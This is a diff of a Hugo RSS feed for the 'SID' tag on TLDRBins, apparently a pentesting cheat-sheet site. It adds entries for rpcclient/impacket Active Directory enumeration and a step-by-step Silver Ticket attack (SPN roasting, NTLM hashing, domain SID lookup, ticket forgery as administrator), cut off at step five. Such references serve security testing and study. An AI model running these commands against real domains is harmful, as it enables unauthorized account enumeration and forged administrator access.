@@ -1,12 +1,26 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Sid on TLDRBins</title>
+    <title>SID on TLDRBins</title>
     <link>https://tldrbins.github.io/@sid/</link>
-    <description>Recent content in Sid on TLDRBins</description>
+    <description>Recent content in SID on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@sid/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>RPC</title>
+      <link>https://tldrbins.github.io/rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rpc/</guid>
+      <description>Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N &amp;lt;TARGET&amp;gt; # Connect with creds rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Inline execute command rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
+    </item>
+    <item>
+      <title>Silver Ticket</title>
+      <link>https://tldrbins.github.io/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/silver_ticket/</guid>
+      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 4. Generate Silver Ticket impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator 5.</description>
+    </item>
     <item>
       <title>SMB Enum</title>
       <link>https://tldrbins.github.io/smb_enum/</link>
